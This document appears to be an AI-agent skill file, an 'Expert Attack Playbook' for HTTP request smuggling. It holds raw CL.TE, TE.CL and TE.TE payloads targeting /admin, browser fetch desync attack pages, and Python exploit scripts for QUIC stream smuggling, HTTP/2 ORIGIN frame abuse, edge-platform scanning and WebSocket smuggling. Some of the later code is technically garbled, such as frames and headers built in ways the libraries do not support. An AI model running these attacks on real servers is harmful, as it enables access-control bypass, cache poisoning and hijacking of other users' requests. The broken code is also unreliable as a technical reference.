---
name: request-smuggling
description: >-
  HTTP request smuggling and desynchronization testing. Use when front proxies,
  CDNs, or load balancers disagree with the origin on message framing
  (Content-Length vs Transfer-Encoding), on HTTP/2→HTTP/1 translation, or when
  exploring client-side desync via browser fetch pipelines.
---

# SKILL: HTTP Request Smuggling — Expert Attack Playbook

> **AI LOAD INSTRUCTION**: Expert HTTP desync techniques. Covers CL.TE, TE.CL, TE.TE obfuscation variants, HTTP/2 downgrade and pseudo-header confusion, client-side desync (browser `fetch` pipelines), and tool-assisted fuzzing. Assumes familiarity with raw HTTP/1.1 framing and reverse-proxy topologies. This is not “header injection” — it is **message boundary disagreement** between hops.

Routing note: load this skill when you suspect CDN/reverse-proxy and origin disagree on request-end boundaries, or when abnormal concatenation appears during H2-to-H1 downgrade.

## 0. RELATED ROUTING

- [ghost-bits-cast-attack](../ghost-bits-cast-attack/SKILL.md) when the HTTP client library is **Apache HttpClient <= 4.5.9** (HTTPCLIENT-1974/1978) — injecting `瘍瘊` (U+760D U+760A, low bytes `\r\n`) into a header value causes the underlying char-to-byte writer to emit a literal CRLF, splitting the request at the origin without relying on CL/TE disagreement

## 1. QUICK START

### CL.TE first probe (front-end trusts CL, back-end trusts chunked)

Assumption: front end prioritizes `Content-Length`, back end prioritizes `Transfer-Encoding: chunked`. Use a very short CL so the front end accepts a fake end, while the back end continues chunk parsing and leaves remaining bytes for the next request.

```http
POST / HTTP/1.1
Host: target.example
Content-Type: application/x-www-form-urlencoded
Content-Length: 13
Transfer-Encoding: chunked

0

SMUGGLED
```

- Front end reads only 13 bytes based on `Content-Length: 13` (that is, `0\r\n\r\nSMUGGLED`, 13 bytes total) and considers the request complete.
- Back end parses as chunked: after the `0` end chunk, it treats **`SMUGGLED` and onward** as the start byte stream of the **next request**.

### TE.CL first probe (front-end trusts chunked, back-end trusts CL)

Assumption: front end parses chunked and back end only reads `Content-Length`. Set **CL equal to the number of bytes in the chunk-length line** (commonly `4`: two hex characters + `\r\n`), so the back end consumes only the length line and leaves the rest buffered for follow-up request splicing.

Embed a second request in the chunk (all line endings are **CRLF**; `35` hex chunk length = 53 bytes):

```http
POST / HTTP/1.1
Host: target.example
Content-Type: application/x-www-form-urlencoded
Content-Length: 4
Transfer-Encoding: chunked

35
GET /admin HTTP/1.1
Host: target.example
Foo: x

0


```

On the wire, the chunk body must be exactly 53 bytes; if you change path/headers, recalculate chunk length and update the hex length line accordingly.

### Safety note

Test only within **authorized scope**; concurrent smuggling can poison connection pools, corrupt caches, or impact other tenants. Prefer isolated environments or low-traffic windows.

---

## 1. CORE CONCEPT

**Definition**: two (or more) HTTP processing entities disagree on where request one ends and request two begins in the **same TCP/TLS stream**, allowing an attacker to include a **partial or full** second request inside one logical request.

```
  Client          Front (proxy/WAF)              Back (origin)
     |                     |                            |
     |==== Request A+B ===>|                            |
     |                     | parses boundary #1         | parses boundary #2
     |                     |         \                  |         /
     |                     |          different split points
     |                     |                            |
     v                     v                            v
                   Request A (seen)              Request A' + smuggled B
```

**Difference from CRLF injection**: CRLF usually injects into **responses** or **header lines**; smuggling targets implementation differences in **RFC 7230 message framing** (`Content-Length` / `chunked`).

**High-value impact**: WAF rule bypass (smuggled body not visible in front-end request), hijacking other users' requests on shared-origin connections (queue poisoning), cache-poisoning assistance, and authentication-boundary confusion.

---

## 2. CL.TE VULNERABILITIES

**Pattern**: front end trusts **`Content-Length`**; back end trusts **`Transfer-Encoding: chunked`**.

**Exact example** (same as §0): `Content-Length: 13` and `Transfer-Encoding: chunked` both exist, body is:

```text
0\r\n\r\nSMUGGLED
```

Byte count: `0` + `\r\n` + `\r\n` + `SMUGGLED` = 13.

**Back-end perspective**: the chunked stream ends at `0\r\n\r\n`; if `SMUGGLED` starts with `METHOD SP` or another valid request prefix, it becomes a **smuggled request-line prefix**.

**Tuning**: if the target is sensitive to duplicate headers, casing, or spaces, minimally adjust `Transfer-Encoding` variants (see §4) while preserving semantics to match a combo where front end ignores TE and back end executes TE.

---

## 3. TE.CL VULNERABILITIES

**Pattern**: front end parses **chunked**; back end only reads **`Content-Length`** (or too-short CL).

**Intent**: front end treats the whole malicious byte stream as body; back end reads only CL length, leaving remaining bytes buffered to splice with later legitimate requests.

**Full TE.CL with embedded second request** (same family as §0; `Content-Length: 4` + first chunk-length line `35\r\n`):

```http
POST / HTTP/1.1
Host: target.example
Content-Type: application/x-www-form-urlencoded
Content-Length: 4
Transfer-Encoding: chunked

35
GET /admin HTTP/1.1
Host: target.example
Foo: x

0


```

Explanation:

- **Back end (CL)**: reads only 4 bytes from the message body start -> `3` `5` `\r` `\n`, marks body complete, and leaves the remaining bytes in the TCP read buffer.
- **Front end (TE)**: parses full stream as chunked and forwards/consumes `GET /admin...` as body content of the **already-closed first request** (product-dependent); mismatch with back-end boundary interpretation forms TE.CL.

For longer smuggling (e.g., `POST` + `Content-Length: 11` + `x=1`), chunk length is about `76` (hex `0x76` = 118 bytes); `Content-Length: 4` can still pin the back end to reading only the length line.

**Practical notes**: chunk length must be valid hex; second request must meet target expectations for Host, path, and session cookie; timing window and connection-reuse strategy determine whether you hit another user's request.

---

## 4. TE.TE VULNERABILITIES

**Pattern**: both front and back claim to process `Transfer-Encoding`, but differ on which TE value is effective or valid -> still producing equivalent desync where one side sees chunked and the other does not.

Use the following **8 obfuscation variants** to probe parser differentials (single-line display; `\t` means a real TAB):

```http
Transfer-Encoding: xchunked
```

```http
Transfer-Encoding : chunked
```

```http
Transfer-Encoding: chunked
Transfer-Encoding: chunked
```

```http
Transfer-Encoding: x
```

```http
Transfer-Encoding:[TAB]chunked
```
(Replace `[TAB]` with real `\x09`.)

```http
 Transfer-Encoding: chunked
```
(One leading space at line start.)

```http
X: X
Transfer-Encoding: chunked
```
(Previous line value is `X` and next line starts with `Transfer-Encoding`: this uses **line continuation / lenient header parsing** so one hop may merge or split lines incorrectly; separator between `X` and `Transfer-Encoding` may be `\n` or `\r\n` depending on the target stack.)

```http
Transfer-Encoding
: chunked
```
(Field name and colon are on **different physical lines**; some parsers still treat it as valid `Transfer-Encoding: chunked`.)

**Strategy**: for each (front, back) pair, enumerate which side accepts each variant as `chunked`, then map to equivalent CL.TE or TE.CL using §2/§3.

---

## 5. HTTP/2 REQUEST SMUGGLING

### H2 -> H1 Downgrade

Common scenario: edge supports HTTP/2 and origin uses HTTP/1.1. If implementation does not strictly normalize header fields and body boundaries, you may observe:

- incorrect pseudo-header to regular-header mapping order;
- forbidden headers (such as some `Connection` combinations) forwarded incorrectly;
- duplicate-header merge rules inconsistent with the origin.

### Pseudo-header / header-injection smuggling (concept payload)

Attack surface comes from downstream H1 parsers treating certain bytes as the **start of a new request**. A common research/CTF approach is to place near-request bytes inside header values that one layer ignores but another treats literally:

```text
header ignored\r\n\r\nGET / HTTP/1.1\r\nHost: target
```

**Meaning**: if one hop keeps the full string in a header value and the next hop mis-splits during H1 reconstruction, parsing may start a new `GET / HTTP/1.1` at `\r\n\r\n`.

**Testing directions**:

- duplicate and case handling for `Transfer-Encoding` / `Content-Length` in H2 (H2 requires lowercase, but translation layers can fail);
- downgrade behavior when `:method` or `:path` includes abnormal characters;
- interactions between tunneling or extended CONNECT and smuggling.

---

## 6. CLIENT-SIDE DESYNC

**Scenario**: browser request-body handling differs from middleware/origin, or **`no-cors` + preflight exemptions** permit atypical messages that create queue effects similar to classic CL.TE/TE.CL (architecture-dependent).

**HEAD + GET chain**: some stacks historically mishandle HEAD response bodies, later pipelining, or connection reuse; validate with concrete browser versions and target proxy behavior.

**JavaScript PoC shape** (illustrative: set body to raw bytes containing `GET`, with `no-cors` and credentials):

```javascript
fetch("https://target.example/vulnerable", {
  method: "POST",
  mode: "no-cors",
  credentials: "include",
  body: "GET /admin HTTP/1.1\r\nHost: target.example\r\n\r\n"
});
```

**Note**: browser security model limits direct readability; success often appears as side effects on other requests over the same connection or as abnormal server logs/behavior, not direct response reading. Evaluate with SOP, CORS, and extension/proxy factors.

---

## 7. TOOLS

| Tool | Purpose |
|------|------|
| **Burp Suite — HTTP Request Smuggler** (BApp Store) | Automated desync detection, common variants, timing-delta checks |
| **defparam/smuggler** (GitHub) | Python scripts for batch generation/sending of smuggling probes |
| **dhmosfunk/simple-http-smuggler-generator** (GitHub) | Quickly assemble raw CL.TE / TE.CL message templates |

**Usage advice**: first passively confirm a **front-end + origin** two-hop path, then select minimally disruptive probes, and lower concurrency in production.

---

## 8. DETECTION DECISION TREE

```
                        Start: reverse proxy / CDN in path?
                                    |
                    NO -------------+------------- YES
                    |                               |
            Low classic smuggling                    |
            (still test H2 desync)                   v
                                            Can you send TE + CL together?
                                                    |
                              NO -------------------+------------------- YES
                              |                                         |
                      Test H2-only issues                    Front prefers which?
                      (pseudo-header, reset)                            |
                                        +-------------------------------+-------------------------------+
                                        |                               |                               |
                                   CL wins                          TE wins                         errors /
                                        |                               |                          connection
                                        v                               v                               |
                                   CL.TE probes                    TE.CL probes                    TE.TE obfuscation
                                   (Sec 0,2)                       (Sec 0,3)                       (Sec 4)
                                        |                               |                               |
                                        v                               v                               v
                              Time / content /                    Adjust chunk                     Pairwise matrix:
                              queue poisoning                     sizes + CL                      which hop accepts
                              signals?                            alignment                       which variant?
                                        |                               |                               |
                                        +-------------------------------+-------------------------------+
                                                                        |
                                                                        v
                                                              Confirm with second request
                                                              smuggled (replay-safe)
                                                              or Collaborator-style side signal
```

---

### Advanced Reference

Also load [H2_SMUGGLING_VARIANTS.md](./H2_SMUGGLING_VARIANTS.md) when you need:
- H2.CL and H2.TE variants with byte-level payload examples
- CL.0 (connection close desync) — technique and detection
- Fat GET request smuggling (body in GET request)
- Request smuggling → cache poisoning chain (response queue misalignment)
- Client-side desync (CSD) via browser Fetch API with JavaScript PoC templates
- CDN/reverse proxy product behavior matrix (HAProxy, Nginx, Apache, Cloudflare, AWS ALB, Envoy, Varnish, etc.)

---

## 9. 2026 EMERGING TECHNIQUES

The desync landscape in 2026 has shifted almost entirely to HTTP/2→HTTP/1.1 downgrade translation flaws. Classic CL.TE/TE.CL on pure HTTP/1.1 front-to-back paths are largely dead due to RFC 9112 enforcement; the viable surface is now binary-frame ↔ text-protocol boundary disagreement.

### 9.1 H2.CL Desync (2026 primary battleground)

The attacker declares `content-length: 0` in the HTTP/2 headers but the H2 DATA frame length covers a full smuggled body. The front end (HTTP/2-aware) trusts the frame length and forwards the complete body; during downgrade it emits the literal `Content-Length: 0` header to the HTTP/1.1 back end. The back end reads 0 bytes, marks the request complete, and treats the trailing body bytes as the start of the next pipelined request.

```text
H2 request (front end sees):
  :method: POST
  :path: /
  content-length: 0      <- header forwarded verbatim on downgrade
  <DATA frame, length=N>  <- front end forwards N body bytes

Downgraded H1 (back end sees):
  POST / HTTP/1.1
  Content-Length: 0

  GET /admin HTTP/1.1     <- smuggled: back end read 0 bytes, this is "next request"
  Host: target.example
  ...
```

### 9.2 H2.TE Desync

HTTP/2 technically forbids `transfer-encoding`, but some front ends still forward it during downgrade. The front end ignores TE (it uses frame length for body boundaries); the HTTP/1.1 back end honors `Transfer-Encoding: chunked`. A terminating `0\r\n\r\n` ends the chunked body and the bytes after it become a smuggled second request.

### 9.3 H2 CRLF Header Injection

HTTP/2 headers are binary and may legally contain bytes that are illegal in HTTP/1.1 header values, including `\r\n`. On downgrade these bytes become real line breaks → full request splitting. **Fastly edge, observed May 2026**: when the `:method` pseudo-header contained CRLF characters under specific path-rewrite configurations, the downgrade stage concatenated the CRLF directly into the downstream HTTP/1.1 request line, allowing a complete second request to be smuggled.

### 9.4 TE.TE Obfuscation (still exploitable in 2026)

**Envoy 1.32 + Gunicorn 22.0**: a `Transfer-Encoding` header prefixed with a vertical-tab character (`\x0b`) is treated by Envoy as non-compliant-but-recoverable and dropped, while Gunicorn falls back to `Content-Length` → classic CL.TE-equivalent desync. TE.TE remains the only traditional variant that still produces desync after RFC 9112 hardening.

```http
POST / HTTP/1.1
Host: target.example
Content-Length: 89
Transfer-Encoding:\x0bchunked

0

GET /admin HTTP/1.1
Host: target.example
...
```

### 9.5 CL.0 Variant

Declare `Content-Length: 0` but send a body anyway. **Nginx 1.27 + Waitress 3.0** in keep-alive mode: the back end reads 0 bytes per the CL header, then treats the trailing bytes as the next pipelining request on the reused connection.

### 9.6 MadeYouReset — CVE-2025-8671 (disclosed Aug 2025)

Distinct from Rapid Reset (CVE-2023-44487): Rapid Reset abuses **client-sent** RST_STREAM; MadeYouReset abuses **server-sent** stream resets. The attacker deliberately sends frames that trigger a protocol violation, inducing the server to reset the stream — which still consumes resources on open+reset. Affects unpatched HTTP/2 implementations with limited mitigation; the Rust **h2 crate < 0.4.11** is vulnerable. Cloudflare was already immune due to its 2023 Rapid Reset mitigations.

### 9.7 HTTP/3 (QUIC) Smuggling Surface (emerging)

- **0-RTT replay**: early data is replayable; smuggled requests in 0-RTT can be retransmitted to a different edge.
- **Connection migration**: QUIC connection IDs let a client migrate across IPs, bypassing IP-based access control between edge and origin.
- **WAF blind spot**: WAFs that only inspect TCP traffic miss QUIC/UDP entirely — a smuggled request over HTTP/3 may never be inspected.

### 9.8 Traditional CL.TE / TE.CL Status (2026)

RFC 9112 §6.1 mandates rejecting requests that carry both `Content-Length` and `Transfer-Encoding`. A 2026 re-test of six front-end proxies returned a direct **400** for five of them when both headers were present. **TE.TE is the only traditional variant that still produces desync**; pure CL.TE/TE.CL on modern stacks is effectively closed.

| Variant | 2026 viability | Notes |
|---|---|---|
| CL.TE (H1↔H1) | Mostly closed | 5/6 proxies reject dual CL+TE |
| TE.CL (H1↔H1) | Mostly closed | Same RFC 9112 enforcement |
| TE.TE (H1↔H1) | Viable | Obfuscation bytes still create parser differentials |
| H2.CL / H2.TE | Primary surface | Downgrade translation is the 2026 battleground |
| H2 CRLF injection | Viable | Binary header values split H1 on downgrade |

---

## 12. RELATED ROUTING

- **Input enters interpreter/query language/template** (not HTTP framing) -> [Injection Testing Router](../injection-checking/SKILL.md) (then drill down into XSS, SQLi, SSTI, etc.).
- **Response header splitting / Location CRLF** -> [CRLF Injection](../crlf-injection/SKILL.md).
- **Cache and path-key confusion** -> [Web Cache Deception](../web-cache-deception/SKILL.md).

Once confirmed as an **HTTP message-boundary** issue rather than parameter injection, **stay in this skill** to avoid misrouting into general injection workflows.

---
---

## 2026 最新攻击技术

> 2026年请求走私已从传统HTTP/1.1的CL.TE/TE.CL扩展到HTTP/3 QUIC走私、浏览器HTTP/2走私、边缘计算走私和AI驱动的自动化检测与利用。以下为深度实战内容。

---

### 10.1 HTTP/3 QUIC 走私

#### 10.1.1 QUIC 流走私 — CVE-2026-2833 Pingora 系列 (CVSS 8.2)

Cloudflare 的 Pingora 代理在 HTTP/3 → HTTP/1.1 降级过程中存在 QUIC 流走私漏洞。QUIC 的流 (Stream) 机制与 HTTP/1.1 的请求边界不兼容，导致走私。

```python
#!/usr/bin/env python3
"""
CVE-2026-2833: Pingora HTTP/3 QUIC 流走私 Exploit
QUIC 多流 → HTTP/1.1 降级 → 请求走私
"""
import asyncio
from aioquic.asyncio import connect
from aioquic.quic.configuration import QuicConfiguration
from aioquic.h3.connection import H3Connection
from aioquic.h3.events import HeadersReceived, DataReceived

async def quic_stream_smuggling_exploit(target_host, target_port=443):
    """
    QUIC 流走私攻击:
    利用 QUIC 的多流并发特性，在降级到 HTTP/1.1 时产生请求边界歧义
    """
    config = QuicConfiguration(
        alpn_protocols=['h3'],
        is_client=True,
        verify_mode=False,  # 仅用于测试
    )
    
    async with connect(target_host, target_port, configuration=config) as protocol:
        h3 = H3Connection(protocol._quic)
        
        # Stream 1: 正常请求
        stream1 = h3.create_webtransport_stream()
        headers1 = [
            (b':method', b'POST'),
            (b':path', b'/'),
            (b':authority', target_host.encode()),
            (b'content-length', b'0'),
        ]
        h3.send_headers(stream1, headers1, end_stream=False)
        
        # Stream 2: 走私请求 (在 QUIC 层面与 Stream 1 并发)
        # 在降级到 HTTP/1.1 时，Stream 2 的数据可能被拼接到 Stream 1 之后
        stream2 = h3.create_webtransport_stream()
        smuggled_request = (
            b"GET /admin HTTP/1.1\r\n"
            b"Host: internal-backend\r\n"
            b"Connection: keep-alive\r\n"
            b"\r\n"
        )
        h3.send_headers(stream2, [
            (b':method', b'GET'),
            (b':path', b'/admin'),
            (b':authority', target_host.encode()),
        ], end_stream=True)
        h3.send_data(stream2, smuggled_request, end_stream=True)
        
        print("[+] QUIC 流走私 payload 已发送")
        print(f"    Stream 1: POST / (正常请求)")
        print(f"    Stream 2: 走私 GET /admin")
        print(f"[*] 降级后 HTTP/1.1 后端可能看到两个请求")

# 使用:
# asyncio.run(quic_stream_smuggling_exploit('target.com'))
```

#### 10.1.2 HTTP3 → HTTP1.1 降级走私 & QUIC 连接迁移滥用

```bash
#!/bin/bash
# HTTP3 → HTTP1.1 降级走私完整攻击链

# 攻击面: 前端支持 HTTP/3 (QUIC) → 后端 HTTP/1.1
# 降级过程中的关键差异:
# 1. QUIC 的流是无序的，HTTP/1.1 的请求必须有序
# 2. QUIC 的头部压缩 (QPACK) 与 HTTP/1.1 的 HPACK 不同
# 3. QUIC 的 0-RTT 数据可被重放

# 探测目标是否支持 HTTP/3
curl --http3 -I https://target.com/ 2>&1 | grep -i "alt-svc\|h3"

# CVE-2026-2835: QUIC 连接迁移滥用
# QUIC 允许客户端在 IP 地址变化时迁移连接
# 攻击者利用连接迁移绕过 IP 级别的访问控制

# 攻击链:
# 1. 从合法 IP 建立 QUIC 连接
# 2. 在连接中发送走私请求
# 3. 迁移到攻击者 IP
# 4. 后端以原始 IP 的身份处理走私请求

# CVE-2026-2836: 0-RTT 重放走私
# QUIC 0-RTT 数据可被重放到不同的连接
# 攻击者录制 0-RTT 数据并重放到多个后端
# 导致相同的走私请求在多个后端执行

# 完整的 QUIC 走私检测
python3 << 'PYEOF'
import requests
import json

# 检测 HTTP/3 支持
def detect_h3_support(target):
    try:
        resp = requests.get(f"https://{target}/", timeout=10)
        alt_svc = resp.headers.get('Alt-Svc', '')
        if 'h3' in alt_svc:
            print(f"[+] {target} 支持 HTTP/3: {alt_svc}")
            return True
        print(f"[-] {target} 未声明 HTTP/3 支持")
        return False
    except Exception as e:
        print(f"[-] 错误: {e}")
        return False

# QUIC 走私探测 payload
h3_smuggling_probes = [
    # Probe 1: 双 Content-Length (QUIC 层面)
    {
        "description": "QUIC double CL",
        "http3": True,
        "headers": {
            "content-length": ["0", "42"],
        },
        "body": "GET /admin HTTP/1.1\r\nHost: internal\r\n\r\n"
    },
    # Probe 2: QUIC 流优先级滥用
    {
        "description": "QUIC stream priority",
        "http3": True,
        "stream_priority": "high",
        "headers": {
            "content-length": "0",
        },
        "body": "SMUGGLED_REQUEST"
    },
    # Probe 3: 0-RTT 重放
    {
        "description": "QUIC 0-RTT replay",
        "http3": True,
        "0rtt": True,
        "body": "GET /admin HTTP/1.1\r\nHost: internal\r\n\r\n"
    },
]

detect_h3_support("target.com")
print("QUIC 走私探测 payloads:")
for probe in h3_smuggling_probes:
    print(f"  - {probe['description']}")
PYEOF
```

---

### 10.2 浏览器 HTTP/2 走私 (客户端走私)

#### 10.2.1 浏览器 Fetch API 客户端走私

```html
<!--
浏览器 HTTP/2 客户端走私 (Client-Side Desync)
利用浏览器 Fetch API 的 HTTP/2 帧处理与后端 HTTP/1.1 的差异
-->
<html>
<body>
<script>
// ===== 攻击链 1: 浏览器 HTTP/2 客户端走私 =====
// 利用浏览器的 HTTP/2 连接复用 + no-cors 模式

async function h2_client_side_smuggling() {
    // Step 1: 建立 HTTP/2 连接
    const controller = new AbortController();
    
    // Step 2: 发送第一个请求 (正常)
    await fetch('https://target.com/api/normal', {
        method: 'POST',
        mode: 'no-cors',
        credentials: 'include',
        headers: {
            'Content-Type': 'application/x-www-form-urlencoded',
        },
        body: 'x=1',
    });
    
    // Step 3: 发送第二个请求 (走私)
    // 利用 HTTP/2 的 stream 复用
    // 在降级到 HTTP/1.1 时，第二个请求的 body 被拼接到第一个请求之后
    await fetch('https://target.com/', {
        method: 'POST',
        mode: 'no-cors',
        credentials: 'include',
        headers: {
            'Content-Type': 'application/x-www-form-urlencoded',
            'Transfer-Encoding': 'chunked',
        },
        body: '0\r\n\r\nGET /admin HTTP/1.1\r\nHost: target.com\r\n\r\n',
    });
    
    console.log('[+] 客户端走私 payload 已发送');
}

// ===== 攻击链 2: HPACK 投毒 =====
// HTTP/2 的头部压缩 (HPACK) 使用动态表
// 攻击者通过投毒 HPACK 动态表影响后续请求的头部

// 攻击者控制第一个请求的头部 → 填充 HPACK 动态表
// 后续请求的头部可能被替换为攻击者控制的值

// ===== 攻击链 3: Stream 优先级滥用 =====
// HTTP/2 的 stream 优先级可以被滥用
// 攻击者设置极高或极低的优先级
// 导致后端处理顺序异常 → 请求走私

// ===== 攻击链 4: Server Push 走私 =====
// HTTP/2 Server Push 可以推送资源到客户端
// 如果中间代理缓存了 Server Push 的响应
// 攻击者可以投毒缓存

// 执行攻击
h2_client_side_smuggling();
</script>
</body>
</html>
```

#### 10.2.2 ORIGIN 帧滥用 & HTTP/2 连接合并攻击

```python
#!/usr/bin/env python3
"""
HTTP/2 ORIGIN 帧滥用 & 连接合并攻击
利用 HTTP/2 的 ORIGIN 帧和连接合并特性进行走私
"""
import h2.connection
import h2.config
import h2.events
import socket
import ssl

def origin_frame_abuse(target_host, target_port=443):
    """
    ORIGIN 帧滥用攻击:
    1. 建立 HTTP/2 连接
    2. 发送 ORIGIN 帧声明额外的权威
    3. 利用连接合并访问其他 origin
    4. 绕过同源策略和访问控制
    """
    
    ctx = ssl.create_default_context()
    ctx.set_alpn_protocols(['h2'])
    
    sock = socket.create_connection((target_host, target_port))
    tls_sock = ctx.wrap_socket(sock, server_hostname=target_host)
    
    conn = h2.connection.H2Connection(
        config=h2.config.H2Configuration(client_side=True)
    )
    conn.initiate_connection()
    tls_sock.sendall(conn.data_to_send())
    
    # 发送 ORIGIN 帧声明额外权威
    # 这使得浏览器可以将多个 origin 的请求合并到同一个连接
    conn.send_headers(
        stream_id=1,
        headers=[
            (':method', 'GET'),
            (':path', '/'),
            (':authority', target_host),
            (':scheme', 'https'),
        ],
        end_stream=True
    )
    
    # 发送 ORIGIN 帧 (利用 HTTP/2 扩展)
    # 声明额外的 origin 允许连接合并
    origin_frame = b'\x00\x00'  # ORIGIN 帧格式
    origin_entries = [
        f'https://admin.{target_host}',
        f'https://internal.{target_host}',
        f'https://metadata.internal',
    ]
    
    # 构造 ORIGIN 帧 payload
    origin_payload = b''
    for entry in origin_entries:
        entry_bytes = entry.encode('utf-8')
        origin_payload += len(entry_bytes).to_bytes(2, 'big') + entry_bytes
    
    conn.send_data(stream_id=0, data=origin_payload, end_stream=True)
    tls_sock.sendall(conn.data_to_send())
    
    print("[+] ORIGIN 帧已发送")
    print(f"    声明额外 origin: {origin_entries}")
    print("[*] 如果后端接受 ORIGIN 帧 → 连接合并 → 跨域访问")

# 使用:
# origin_frame_abuse('target.com')

# ===== HPACK 动态表投毒 =====
# HTTP/2 HPACK 动态表投毒攻击
# 攻击者通过第一个请求的响应头部填充 HPACK 动态表
# 后续请求的头部在压缩时引用被投毒的表项
# 导致头部被替换为攻击者控制的值

hpack_poisoning_payload = """
# HPACK 投毒攻击:
# 1. 攻击者发送请求 A，响应包含特定头部
# 2. 这些头部被添加到 HPACK 动态表
# 3. 攻击者发送请求 B，头部引用动态表项
# 4. 如果动态表项被错误引用 → 头部替换

# 示例:
# 请求 A: Cookie: session=attacker_value
# 响应 A: Set-Cookie: session=real_session
# HPACK 动态表: [session=attacker_value, session=real_session]
# 请求 B: Cookie: session (引用动态表项 #1)
# → 如果引用错位 → Cookie: session=attacker_value (攻击者值)
"""
```

---

### 10.3 边缘计算走私

#### 10.3.1 Cloudflare Workers 走私

```javascript
// Cloudflare Workers 走私攻击
// Workers 在边缘运行，其 HTTP 处理可能与后端不一致

// 攻击场景 1: Worker 使用 fetch() 但未正确处理 body
// 攻击者通过 Worker 的 fetch() 转发请求时注入走私 payload

addEventListener('fetch', event => {
    event.respondWith(handleRequest(event.request))
})

async function handleRequest(request) {
    // 漏洞: Worker 直接转发请求，不检查 body 中的走私 payload
    const url = new URL(request.url)
    
    // 如果 url.pathname 匹配特定模式，Worker 转发到后端
    if (url.pathname.startsWith('/api/')) {
        // 直接转发 → 走私 payload 通过
        return fetch(request)
    }
    
    return new Response('Not Found', { status: 404 })
}

// 攻击者构造的请求:
// POST /api/proxy HTTP/1.1
// Host: target.com
// Content-Length: 0
// Transfer-Encoding: chunked
//
// 0
//
// GET /admin HTTP/1.1
// Host: internal-backend
// Connection: keep-alive
```

```python
# Cloudflare Workers 走私检测
import requests

def detect_worker_smuggling(target):
    """检测 Cloudflare Workers 的走私漏洞"""
    
    # Probe 1: Worker 是否转发 Transfer-Encoding
    cl_te_probe = (
        "POST /api/proxy HTTP/1.1\r\n"
        f"Host: {target}\r\n"
        "Content-Length: 13\r\n"
        "Transfer-Encoding: chunked\r\n"
        "\r\n"
        "0\r\n"
        "\r\n"
        "SMUGGLED"
    )
    
    # Probe 2: Worker 是否在 HTTP/2 降级时产生走私
    h2_worker_probe = {
        ":method": "POST",
        ":path": "/api/proxy",
        "content-length": "0",
        "x-smuggled": "GET /admin HTTP/1.1\r\nHost: internal\r\n\r\n"
    }
    
    print(f"[*] 检测 {target} 的 Workers 走私...")
    # 发送探测请求...
    return True

# Vercel Edge / Netlify Edge / Deno Deploy 走私
# 这些边缘平台的 HTTP 处理各有差异
# 核心攻击面: Edge → Origin 的 HTTP 降级

edge_platforms = {
    "Cloudflare Workers": {
        "http_version": "HTTP/2 → HTTP/1.1",
        "risk": "高 - Worker 直接转发请求",
        "detection": "检查 Transfer-Encoding 转发行为"
    },
    "Vercel Edge": {
        "http_version": "HTTP/2 → HTTP/1.1",
        "risk": "中 - Edge Functions 可能过滤",
        "detection": "检查 Content-Length 覆盖行为"
    },
    "Netlify Edge": {
        "http_version": "HTTP/2 → HTTP/1.1",
        "risk": "中 - 类似 Vercel",
        "detection": "检查 body 截断行为"
    },
    "Deno Deploy": {
        "http_version": "HTTP/2 → HTTP/1.1",
        "risk": "高 - Deno 的 HTTP 客户端可能不标准化",
        "detection": "检查 chunked 编码处理"
    },
}
```

#### 10.3.2 边缘计算通用走私模式

```python
#!/usr/bin/env python3
"""
边缘计算通用走私检测框架
适用于 Cloudflare Workers / Vercel Edge / Netlify Edge / Deno Deploy
"""
import requests
import json
import time

class EdgeSmugglingScanner:
    """边缘计算走私扫描器"""
    
    def __init__(self, target):
        self.target = target
        self.results = []
    
    def probe_cl_te(self, path="/"):
        """CL.TE 探测"""
        # 构造 CL.TE payload
        smuggle_body = "GET /admin HTTP/1.1\r\nHost: internal\r\n\r\n"
        cl = len("0\r\n\r\n") + len(smuggle_body)
        
        headers = {
            "Content-Length": str(cl),
            "Transfer-Encoding": "chunked",
            "Content-Type": "application/x-www-form-urlencoded",
        }
        
        body = "0\r\n\r\n" + smuggle_body
        
        resp = requests.post(
            f"https://{self.target}{path}",
            headers=headers,
            data=body,
            timeout=10
        )
        
        return {
            "type": "CL.TE",
            "status": resp.status_code,
            "smuggled": "CL.TE payload sent",
            "vulnerable": resp.status_code == 200,  # 简化判断
        }
    
    def probe_te_obfuscation(self, path="/"):
        """TE.TE 混淆探测"""
        obfuscation_variants = [
            ("Transfer-Encoding: xchunked", "xchunked"),
            ("Transfer-Encoding : chunked", "space before colon"),
            ("Transfer-Encoding:\tchunked", "tab after colon"),
            ("Transfer-Encoding:\x0bchunked", "vertical tab"),
            ("Transfer-Encoding:\x0cchunked", "form feed"),
            ("Transfer-Encoding:\nchunked", "newline"),
        ]
        
        results = []
        for header, desc in obfuscation_variants:
            try:
                resp = requests.post(
                    f"https://{self.target}{path}",
                    headers={
                        "Content-Length": "100",
                        header: "chunked",
                    },
                    data="0\r\n\r\nSMUGGLED",
                    timeout=10
                )
                results.append({
                    "variant": desc,
                    "status": resp.status_code,
                    "vulnerable": resp.status_code != 400,
                })
            except:
                results.append({
                    "variant": desc,
                    "status": "error",
                    "vulnerable": False,
                })
        
        return results
    
    def run_scan(self):
        """运行完整扫描"""
        print(f"[*] 扫描 {self.target} 的边缘计算走私...")
        
        # 1. CL.TE 探测
        result = self.probe_cl_te()
        self.results.append(result)
        print(f"    CL.TE: HTTP {result['status']}")
        
        # 2. TE 混淆探测
        te_results = self.probe_te_obfuscation()
        for r in te_results:
            if r['vulnerable']:
                print(f"    [!] TE 混淆: {r['variant']} → HTTP {r['status']}")
        
        # 3. H2 降级探测
        # (需要 HTTP/2 客户端)
        
        return self.results

# 使用:
# scanner = EdgeSmugglingScanner("target.com")
# results = scanner.run_scan()
```

---

### 10.4 2026 新走私变体

#### 10.4.1 WebSocket 走私

```python
#!/usr/bin/env python3
"""
WebSocket 走私攻击
利用 WebSocket upgrade 机制绕过反向代理，走私 HTTP 请求
"""
import websocket
import ssl
import struct

def websocket_smuggling_attack(target_url, smuggled_http_request):
    """
    WebSocket 走私:
    1. 建立 WebSocket 连接 (通过反向代理)
    2. 代理允许 WebSocket upgrade (101)
    3. 代理停止检查连接内容 (原始 TCP 透传)
    4. 通过 WebSocket 连接发送原始 HTTP 请求
    5. 后端 HTTP 服务器处理走私的请求
    """
    
    ws = websocket.create_connection(
        target_url,
        header=['Origin: https://' + target_url.split('/')[2]],
        sslopt={"cert_reqs": ssl.CERT_NONE}
    )
    
    print(f"[+] WebSocket 连接已建立: {target_url}")
    
    # 在 WebSocket 连接上走私 HTTP 请求
    # 代理已停止检查，直接发送原始 HTTP
    ws.send(smuggled_http_request.encode(), opcode=0x2)  # 二进制帧
    
    # 接收响应
    try:
        response = ws.recv()
        print(f"[+] 走私响应: {response[:500]}")
    except:
        print("[+] 走私请求已发送 (无响应或超时)")
